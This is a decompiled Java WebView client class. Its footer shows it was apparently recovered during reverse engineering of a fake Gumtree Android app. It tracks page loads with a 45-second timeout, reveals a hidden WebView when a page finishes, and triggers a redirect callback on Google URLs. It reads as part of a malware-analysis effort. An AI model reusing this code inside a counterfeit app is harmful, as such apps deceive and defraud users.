package com.gumsis.wb;

import android.annotation.TargetApi;
import android.graphics.Bitmap;
import android.net.Uri;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.lang.ref.WeakReference;
import java.util.concurrent.TimeUnit;

public class CustomWVClient
  extends WebViewClient
{
  private final long LOADING_ERROR_TIMEOUT = TimeUnit.SECONDS.toMillis(45L);
  private boolean mLoadingError = false;
  private boolean mLoadingFinished = false;
  private String mOnErrorUrl;
  private OnWVClicentCallback mOnWVClicentCallback;
  private final Runnable mPageLoadingTimeoutHandlerTask = new Runnable()
  {
    public void run()
    {
      CustomWVClient.access$102(CustomWVClient.this, null);
      CustomWVClient.access$202(CustomWVClient.this, true);
      if (CustomWVClient.this.mReference != null)
      {
        WebView localWebView = (WebView)CustomWVClient.this.mReference.get();
        if (localWebView != null) {
          localWebView.stopLoading();
        }
      }
    }
  };
  private WeakReference<WebView> mReference;
  private String mUrl;
  
  CustomWVClient(OnWVClicentCallback paramOnWVClicentCallback)
  {
    this.mOnWVClicentCallback = paramOnWVClicentCallback;
  }
  
  private String removeLastSlash(String paramString)
  {
    while (paramString.endsWith("/")) {
      paramString = paramString.substring(0, paramString.length() - 1);
    }
    return paramString;
  }
  
  private boolean startsWith(String paramString1, String paramString2)
  {
    return (paramString1 != null) && (paramString2 != null) && (paramString1.startsWith(paramString2));
  }
  
  public void onPageFinished(WebView paramWebView, String paramString)
  {
    paramString = removeLastSlash(paramString);
    if ((startsWith(paramString, this.mUrl)) && (!this.mLoadingFinished))
    {
      this.mLoadingFinished = true;
      paramWebView.removeCallbacks(this.mPageLoadingTimeoutHandlerTask);
      this.mOnErrorUrl = null;
      this.mUrl = null;
      if (paramWebView.getVisibility() == 4) {
        paramWebView.setVisibility(0);
      }
      if (paramString.contains("https://www.google")) {
        this.mOnWVClicentCallback.onRedirect(paramWebView, paramString);
      }
    }
    while (this.mUrl != null) {
      return;
    }
    paramWebView.setWebViewClient(new CustomWVClient(new OnWVClicentCallback()
    {
      public void onRedirect(WebView paramAnonymousWebView, String paramAnonymousString)
      {
        CustomWVClient.this.mOnWVClicentCallback.onRedirect(paramAnonymousWebView, paramAnonymousString);
      }
    }));
    this.mLoadingFinished = true;
  }
  
  public void onPageStarted(WebView paramWebView, String paramString, Bitmap paramBitmap)
  {
    paramString = removeLastSlash(paramString);
    if (startsWith(paramString, this.mOnErrorUrl))
    {
      this.mUrl = paramString;
      this.mLoadingError = true;
      this.mLoadingFinished = false;
      onPageFinished(paramWebView, paramString);
    }
    if (this.mUrl == null)
    {
      this.mUrl = paramString;
      this.mLoadingError = false;
      this.mLoadingFinished = false;
      paramWebView.removeCallbacks(this.mPageLoadingTimeoutHandlerTask);
      paramWebView.postDelayed(this.mPageLoadingTimeoutHandlerTask, this.LOADING_ERROR_TIMEOUT);
      this.mReference = new WeakReference(paramWebView);
    }
  }
  
  public void onReceivedError(WebView paramWebView, int paramInt, String paramString1, String paramString2)
  {
    if ((this.mUrl != null) && (!this.mLoadingError))
    {
      this.mLoadingError = true;
      return;
    }
    this.mOnErrorUrl = removeLastSlash(paramString2);
  }
  
  @TargetApi(23)
  public void onReceivedError(WebView paramWebView, WebResourceRequest paramWebResourceRequest, WebResourceError paramWebResourceError)
  {
    if ((this.mUrl != null) && (!this.mLoadingError))
    {
      this.mLoadingError = true;
      return;
    }
    this.mOnErrorUrl = removeLastSlash(paramWebResourceRequest.getUrl().toString());
  }
  
  @TargetApi(21)
  public void onReceivedHttpError(WebView paramWebView, WebResourceRequest paramWebResourceRequest, WebResourceResponse paramWebResourceResponse)
  {
    if ((this.mUrl != null) && (!this.mLoadingError))
    {
      this.mLoadingError = true;
      return;
    }
    this.mOnErrorUrl = removeLastSlash(paramWebResourceRequest.getUrl().toString());
  }
  
  public boolean shouldOverrideUrlLoading(WebView paramWebView, String paramString)
  {
    paramString = removeLastSlash(paramString);
    if ((!startsWith(paramString, this.mUrl)) && (!this.mLoadingFinished))
    {
      this.mUrl = null;
      onPageStarted(paramWebView, paramString, null);
    }
    return false;
  }
  
  static abstract interface OnWVClicentCallback
  {
    public abstract void onRedirect(WebView paramWebView, String paramString);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/wb/CustomWVClient.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */